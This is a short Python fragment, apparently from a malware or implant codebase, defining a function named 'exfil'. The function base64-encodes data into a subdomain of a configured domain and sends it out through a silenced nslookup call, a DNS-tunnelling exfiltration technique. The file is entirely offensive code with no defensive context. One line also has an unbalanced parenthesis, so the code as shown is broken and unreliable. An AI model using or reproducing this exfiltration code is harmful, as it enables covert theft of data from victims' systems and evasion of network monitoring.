from core.crypto_ops import encrypt_payload
import subprocess, base64
from config import CONFIG

def exfil(data):
    encoded = base64.urlsafe_b64encode(data.encode())).decode()
    domain = f"{encoded[:50]}.{CONFIG['dns_domain']}"
    subprocess.run(["nslookup", domain], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)